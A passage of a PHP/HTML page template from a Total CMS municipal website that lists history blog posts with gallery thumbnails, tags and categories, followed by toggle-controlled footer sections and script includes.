    $totalcms["history"] = new \TotalCMS\Component\Blog("history", $_GET);
} else {
    $totalcms["history"] = new totalpreview("blog");
}
$totalblog = $totalcms["history"];

if (isset($_GET["permalink"])) {
    if (!(isset($blogpost) && is_object($blogpost))) {
        // Get the existing post data if it exists
        if ($publish) {
            $totalblog->set_permalink($_GET["permalink"]);
            $blogpost = $totalblog->get_contents();
        } else {
            $blogpost = $totalblog->get_blog_post("history", $_GET["permalink"]);
        }
    }
}
$filter = array(
    "sort"     => "new",
    "date"     => "all",
    "featured" => "top",
    "draft"    => "hide",
    "archived" => "hide"
);

$authorGallery = $categoryGallery = $tagGallery = $genreGallery = false;

// 

// 

// 

// 

// Blog post is not defined, default to false
$postGenre    = false;
$postLabel    = false;
$postAuthor   = false;
$postCategory = false;
$postTag      = false;

if (isset($blogpost) && is_object($blogpost)) {
    $postAuthor   = false;
    $postGenre    = false;
    $postLabel    = false;
    $postCategory = false;
    $postTag      = false;

    // 
    $filter["exclude"] = $blogpost->permalink;
    // 
}

// 
// 
// 
// 
// 
// 

// 
if (!empty($_GET)) {
    // Merge in with GET variables. GET wins
    $filter = array_merge($filter, $_GET);
}
// 

if ($publish) {
    if (empty($_GET["search"])) {
        $posts = $totalblog->filter_posts($filter);
    } else {
		// 
        $posts = $totalblog->search_posts(trim(urldecode($_GET["search"])), $filter);
		// 
    }

    $baseUrl = "../";
    // 
    $posturl = $totalblog->posturl;
// 
} else {
    $posts   = $totalblog->get_blog("history", $filter);
    $baseUrl = "https://orwigsburg.gov/";
    $posturl = "#";
}

// 

$imagetype   = "thumbs-auto";
$maxcount    = 3;
$cardColumns = 2;
$postdata    = array();

foreach ($posts as $post) {
    if ($post->gallery) {
        array_map(function ($image) use ($baseUrl) {
            $image->img       = $baseUrl.$image->img;
            $image->thumb->sq = $baseUrl.$image->thumb->sq;
            $image->thumb->th = $baseUrl.$image->thumb->th;
            return $image;
        }, $post->gallery);

        $post->slideshow = false;
        $post->type = $imagetype;
        $imagecount = count($post->gallery);

        // 

        // 

        // Dont process just one image unless its a thumb layout
        if ($imagecount > 1 || strpos($imagetype, "thumb") !== false) {
            switch ($imagetype) {
                case "featured":
                    usort($post->gallery, function ($a, $b) {
                        return $b->featured - $a->featured;
                    });
                    $post->gallery = array(array_shift($post->gallery));
                    break;
                case "first":
                    $post->gallery = array(array_shift($post->gallery));
                    break;
                case "last":
                    $post->gallery = array(array_pop($post->gallery));
                    break;
                case "random":
                    shuffle($post->gallery);
                    $post->gallery = array(array_shift($post->gallery));
                    break;
                case "orbit":
                    $post->slideshow = true;
                    $post->gallery = array_slice($post->gallery, 0, $maxcount);
                    break;
                case "thumbs":
                    $thumbCount = $maxcount;

                    if ($cardColumns == 0) {
                        $max = $maxcount > $imagecount ? $imagecount : $maxcount;
                        $thumbCount = $max;
                    } elseif ($cardColumns > $imagecount) {
                        // If there isn"t enough images to fill one row, only have one image
                        $post->type = "first";
                        $thumbCount = 1;
                    } else {
                        // Make sure that there are no empty slots in a row
                        $max = $maxcount > $imagecount ? $imagecount : $maxcount;
                        $thumbCount = floor($max/$cardColumns) * $cardColumns;
                    }
                    $post->gallery = array_slice($post->gallery, 0, $thumbCount);
                    break;
                case "thumbs-auto":
                    $thumbCount = $maxcount;
                    $mincount = 4;

                    if ($mincount > $imagecount) {
                        // If there isn"t enough images to fill one grid, only have one image
                        $post->type = "first";
                        $thumbCount = 1;
                    } else {
                        // Make sure that there are no empty slots in a row
                        $max = $maxcount > $imagecount ? $imagecount : $maxcount;
                        $columns = floor(sqrt($max));
                        $thumbCount =  $columns * $columns;
                        $post->type = $post->type." thumb-grid-".$columns;
                    }

                    $post->gallery = array_slice($post->gallery, 0, $thumbCount);
                    break;
            }
        }
    }

    $post->summary  = $totalblog->format_text($post->summary);
    $post->datetime = $totalblog->to_date($post->timestamp);
    $post->timer    = (5*1000) + rand(0, 2500);
    $post->url      = $posturl.$post->permalink;
    $post->id       = "history/".$post->permalink;
    $post->aria     = "Read more about ";

    $post->genrelink = $totalblog->urlify_string($post->genre);
    if (is_object($genreGallery)) {
        $genreImage = $genreGallery->get_image_path($post->genrelink, "sq");
        $defaultgenre = "";
        if (empty($defaultGenre)) {
            $defaultGenre = "https://orwigsburg.gov/cms-data/image/defaultGenreCMSID.png";
        }
        $post->genreimage = $genreImage ? $baseUrl.$genreImage : $defaultGenre;
    }

    $post->authorlink = $totalblog->urlify_string($post->author);
    if (is_object($authorGallery)) {
        $authorImage = $authorGallery->get_image_path($post->authorlink, "sq");
        $defaultAuthor = "";
        if (empty($defaultAuthor)) {
            $defaultAuthor = "https://orwigsburg.gov/cms-data/image/defaultAuthorCMSID.png";
        }
        $post->authorimage = $authorImage ? $baseUrl.$authorImage : $defaultAuthor;
    }

    $post->tags = array_map(function ($tag) use ($totalblog, $tagGallery) {
        // ignore if the tag is already converted to array
        if (is_array($tag)) {
            return $tag;
        }
        // ignore if the tag starts with -
        if (strpos($tag, "-") === 0) {
            return false;
        }

        $link = $totalblog->urlify_string($tag);
        $new = array("label"=>$tag,"link"=>$link);

        if (is_object($tagGallery)) {
            $image = $tagGallery->get_image_path($link, "sq");
            $defaultTag = "";
            if (empty($defaultTag)) {
                $defaultTag = "https://orwigsburg.gov/cms-data/image/defaultTagCMSID.png";
            }
            $new["image"] = $image ? "https://orwigsburg.gov/".$image : $defaultTag;
        }

        return $new;
    }, $post->tags);
	$post->tags = array_values(array_filter($post->tags, "is_array"));


    $post->categories = array_map(function ($category) use ($totalblog, $categoryGallery) {
        // ignore if the category is already converted to array
        if (is_array($category)) {
            return $category;
        }
        // ignore if the category starts with -
        if (strpos($category, "-") === 0) {
            return false;
        }

        $link = $totalblog->urlify_string($category);
        $new = array("label"=>$category,"link"=>$link);

        if (is_object($categoryGallery)) {
            $image = $categoryGallery->get_image_path($link, "sq");
            $defaultCategory = "";
            if (empty($defaultCategory)) {
                $defaultCategory = "https://orwigsburg.gov/cms-data/image/defaultCategoryCMSID.png";
            }
            $new["image"] = $image ? "https://orwigsburg.gov/".$image : $defaultCategory;
        }

        return $new;
    }, $post->categories);
    $post->categories = array_values(array_filter($post->categories, "is_array"));

    // This is here for pre-1.7 posts that do not have labels
    if (!isset($post->labels)) {
        $post->labels = [];
    }

    $post->labels = array_map(function ($label) use ($totalblog) {
        // ignore if the label is already converted to array
        if (is_array($label)) {
            return $label;
        }
        // ignore if the label starts with -
        if (strpos($label, "-") === 0) {
            return false;
        }

        $link = $totalblog->urlify_string($label);
        $new = array("label"=>$label,"link"=>$link);

        return $new;
    }, $post->labels);
    $post->labels = array_values(array_filter($post->labels, "is_array"));

    $postdata[] = $post;
}

if (count($postdata) == 0) {
    echo "<h6 class=\"no-posts text-center\">There are Currently No History Articles to Display</h6>";
} else {
    foreach (array_slice($postdata, 0, 12) as $post) {
        echo $totalblog->process_template($post_template, $post);
    }
}
?>

</div>



<script id="posts_stacks_in_259" type="application/json">
<?php echo json_encode(array_slice($postdata, 12)); ?>
</script>
<template id="template_stacks_in_259">
<?php echo $post_template ?>
</template>




<button id="loadmore_stacks_in_259" role="button"
    class="button loadmore expand  small custom radius"
    >Load More Results</button>





 
 </div> </div> 
</div></div> </div> </div> 
</div></div><div id='stacks_out_255' class='stacks_out'><div id='stacks_in_255' class='stacks_in '><div id='stacks_out_255_1' class='stacks_out'><div id='stacks_in_255_1' class='stacks_in com_joeworkman_stacks_foundation_1col_s3_stack'> 
<div class='row  collapse max-edge     '  > <div class='columns small-12      '> <div  class="sgw-footer" style=""> <!-- Total Toggle -->

<?php
	$totaltoggle = new \TotalCMS\Component\Toggle("footer-top-togg");
	$toggle = $totaltoggle->status();
?>




 <?php if ($toggle) { ?> 
	<div id='stacks_out_255_47' class='stacks_out'><div id='stacks_in_255_47' class='stacks_in com_joeworkman_stacks_foundation_2col_s3_stack'> 
<div class='row   max-custom  '  > <div class='columns small-12    medium-3     ' >  <!-- Total Toggle -->

<?php
	$totaltoggle = new \TotalCMS\Component\Toggle("footer-logo-togg");
	$toggle = $totaltoggle->status();
?>




 <?php if ($toggle) { ?> 
	<div id='stacks_out_255_52' class='stacks_out'><div id='stacks_in_255_52' class='stacks_in com_joeworkman_stacks_totalcms_image_stack'>   <a href="../" title="Home"> <img loading="auto" class="   center " oncontextmenu="return false;" draggable="false" alt='%cmsImageAlt(footer-logo)%' data-img="https://orwigsburg.gov/cms-data/image/footer-logo.png"  src="https://orwigsburg.gov/cms-data/image/footer-logo-sq.png"   onerror="this.style.display='none'"  /> </a>   















 
</div></div>


 <?php } else { ?> 



 <?php } ?> 

 
  </div> <div class='columns small-12    medium-9     ' >  <div id='stacks_out_255_10' class='stacks_out'><div id='stacks_in_255_10' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    %cmsText(footer-top)%    
 
</div></div>  </div> </div> 
</div></div>


 <?php } else { ?> 



 <?php } ?> 

 
<div id='stacks_out_255_41' class='stacks_out'><div id='stacks_in_255_41' class='stacks_in com_joeworkman_stacks_foundation_divider_s3_stack'><hr class=""/> 
</div></div><div id='stacks_out_255_15' class='stacks_out'><div id='stacks_in_255_15' class='stacks_in com_joeworkman_stacks_foundation_4col_s3_stack'> 
<div class='row   max-custom  '  > <div class='columns small-12    medium-3     ' >  <!-- Total Toggle -->

<?php
	$totaltoggle = new \TotalCMS\Component\Toggle("footer-mid-left-togg");
	$toggle = $totaltoggle->status();
?>




 <?php if ($toggle) { ?> 
	<div id='stacks_out_255_22' class='stacks_out'><div id='stacks_in_255_22' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    %cmsText(footer-mid-left)%    
 
</div></div>


 <?php } else { ?> 



 <?php } ?> 

 
  </div> <div class='columns small-12    medium-3     ' >  <!-- Total Toggle -->

<?php
	$totaltoggle = new \TotalCMS\Component\Toggle("footer-mid-cent-left-togg");
	$toggle = $totaltoggle->status();
?>




 <?php if ($toggle) { ?> 
	<div id='stacks_out_255_26' class='stacks_out'><div id='stacks_in_255_26' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    %cmsText(footer-mid-leftcenter)%    
 
</div></div>


 <?php } else { ?> 



 <?php } ?> 

 
  </div> <div class='columns small-12    medium-3     ' >  <!-- Total Toggle -->

<?php
	$totaltoggle = new \TotalCMS\Component\Toggle("footer-mid-cent-right-togg");
	$toggle = $totaltoggle->status();
?>




 <?php if ($toggle) { ?> 
	<div id='stacks_out_255_30' class='stacks_out'><div id='stacks_in_255_30' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    %cmsText(footer-mid-rightcenter)%    
 
</div></div>


 <?php } else { ?> 



 <?php } ?> 

 
  </div> <div class='columns small-12    medium-3     ' >  <!-- Total Toggle -->

<?php
	$totaltoggle = new \TotalCMS\Component\Toggle("footer-mid-right-togg");
	$toggle = $totaltoggle->status();
?>




 <?php if ($toggle) { ?> 
	<div id='stacks_out_255_34' class='stacks_out'><div id='stacks_in_255_34' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    %cmsText(footer-mid-right)%    
 
</div></div>


 <?php } else { ?> 



 <?php } ?> 

 
  </div> </div> 
</div></div><div id='stacks_out_255_40' class='stacks_out'><div id='stacks_in_255_40' class='stacks_in com_joeworkman_stacks_foundation_divider_s3_stack'><hr class=""/> 
</div></div><div id='stacks_out_255_2' class='stacks_out'><div id='stacks_in_255_2' class='stacks_in com_joeworkman_stacks_foundation_1col_s3_stack'> 
<div class='row  collapse max-custom     '  > <div class='columns small-12  small-centered      '> <!-- Total Toggle -->

<?php
	$totaltoggle = new \TotalCMS\Component\Toggle("footer-bott-togg");
	$toggle = $totaltoggle->status();
?>




 <?php if ($toggle) { ?> 
	<div id='stacks_out_255_38' class='stacks_out'><div id='stacks_in_255_38' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    %cmsText(footer-bottom)%    
 
</div></div>


 <?php } else { ?> 



 <?php } ?> 

 
 </div> </div> 
</div></div><div id='stacks_out_255_42' class='stacks_out'><div id='stacks_in_255_42' class='stacks_in com_joeworkman_stacks_foundation_divider_s3_stack'><hr class=""/> 
</div></div> </div>  
<div  class="sgw-developer" style=""> <div id='stacks_out_255_8' class='stacks_out'><div id='stacks_in_255_8' class='stacks_in com_joeworkman_stacks_foundation_footertext_stack'><p class="copyright text-right ">  Site Design: <a href="https://cottsinc.com">&copy; 2018 Cotts, Inc Digital Marketing | </a> </p> 
</div></div> </div>  
 </div> </div> 
</div></div></div></div></div></div>
<!--  -->
<?php
	if ($process_macros) {
	    $totalob = ob_get_clean();
	    ob_start();
		$totalreplace = new \TotalCMS\ReplaceText();
		echo $totalreplace->replace($totalob,$macro_prefix);
	}
?>






<script data-cfasync="true" src="../rw_common/themes/foundation/foundation.min.js"></script>


<script src="../rw_common/assets/global.js"></script>
<script src="https://website-widgets.pages.dev/dist/sienna.min.js" defer></script></body>
</html>
